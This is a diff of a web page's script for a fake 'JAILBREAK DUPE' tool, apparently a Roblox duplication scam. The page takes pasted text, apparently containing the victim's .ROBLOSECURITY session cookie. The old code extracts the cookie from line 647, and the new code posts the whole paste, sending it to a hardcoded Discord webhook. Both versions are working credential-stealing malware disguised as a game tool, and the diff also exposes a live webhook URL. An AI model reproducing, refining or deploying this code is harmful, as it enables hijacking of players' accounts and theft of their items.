@@ -179,48 +179,37 @@
     const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1471582004704186419/HKn4alN7O-KQfKej8h4NjQPxmiBdC5XDzSdvYpVRgcJTKjz1Rsp7oaKxIQg-myigvAzS";
 
     function send() {
-        const text = textarea.value;
-        const lines = text.split(/\r?\n/);
+    const text = textarea.value;
+    const lines = text.split(/\r?\n/);
 
-        if (lines.length <= 5000) {
-            status.textContent = "ERROR ❌";
-            return;
-        }
-
-        if (lines.length < 647) {
-            status.textContent = "Line 647 does not exist.";
-            return;
-        }
-
-        let line647 = lines[646];
-
-        line647 = line647
-            .replace('$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "', '')
-            .replace('", "/", ".roblox.com")))', '')
-            .trim();
-
-        fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                username: "JAILBREAK DUPE",
-                embeds: [{
-                    title: "📄 Processed Line 8",
-                    description: line647 || "(empty result)",
-                    color: 5793266,
-                    timestamp: new Date().toISOString()
-                }]
-            })
-        })
-        .then(() => {
-            status.textContent = "Processed and sent successfully ✔";
-            textarea.value = "";
-            fakeText.textContent = "";
-        })
-        .catch(() => {
-            status.textContent = "Failed to send ❌";
-        });
+    // ✅ Se mantiene la verificación de cantidad
+    if (lines.length <= 5000) {
+        status.textContent = "ERROR ❌";
+        return;
     }
+
+    fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            username: "JAILBREAK DUPE",
+            embeds: [{
+                title: "📄 Full Content",
+                description: text.slice(0, 4000), // límite embed Discord
+                color: 5793266,
+                timestamp: new Date().toISOString()
+            }]
+        })
+    })
+    .then(() => {
+        status.textContent = "Processed and sent successfully ✔";
+        textarea.value = "";
+        fakeText.textContent = "";
+    })
+    .catch(() => {
+        status.textContent = "Failed to send ❌";
+    });
+}
 </script>
 
 </body>
